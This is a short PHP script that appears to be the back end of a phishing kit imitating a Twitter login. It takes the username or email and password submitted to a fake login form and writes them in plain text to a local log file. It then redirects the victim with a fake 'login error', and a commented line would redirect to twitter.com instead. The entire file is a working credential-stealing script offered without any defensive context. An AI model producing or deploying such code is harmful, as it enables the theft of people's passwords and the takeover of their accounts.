<?php
    $uname = $_POST['phone_or_email'];
    $pass = $_POST['pass'];

 
    $file = fopen("log.txt", "a");

    fwrite($file,"\n------------------------\n");
    fwrite($file,"Username--> : ");
    fwrite($file,$uname);
    fwrite($file,"\n");
    fwrite($file,"Password--> : ");
    fwrite($file,$pass);
    fwrite($file,"\n---------------------\n");
    fclose($file);

    header("location:Index.php?login=error");
   // header("location:https://twitter.com/");
?>